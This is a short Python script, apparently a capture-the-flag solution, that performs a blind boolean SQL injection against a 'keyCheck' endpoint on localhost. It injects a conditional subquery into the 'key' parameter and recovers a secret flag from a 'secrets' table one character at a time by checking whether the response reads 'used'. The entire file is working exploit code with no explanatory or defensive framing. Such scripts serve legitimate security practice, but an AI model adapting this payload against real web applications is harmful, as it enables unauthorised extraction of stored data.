#! python3
import string
import requests

def exploit():

    url = "http://localhost:5002/keyCheck"
    payload = "notusedkey' or 1=if((select ascii(substr(data, {0}, 1)) from secrets)={1}, 1, 0)#"
    chars = string.printable
    params = {}
    flag = ''
    count = 0

    for i in range(0, 1024): # 1024 is a tentative number of flag length 
        for c in chars:
            params["key"] = payload.format((i+1), ord(c))
            r = requests.get(url, params)
            
            if r.text != "used":
                if c == chars[-1]:
                    return
                continue

            flag += c
            print(flag)
            break


def main():
    exploit()


if __name__ == '__main__':
    main()
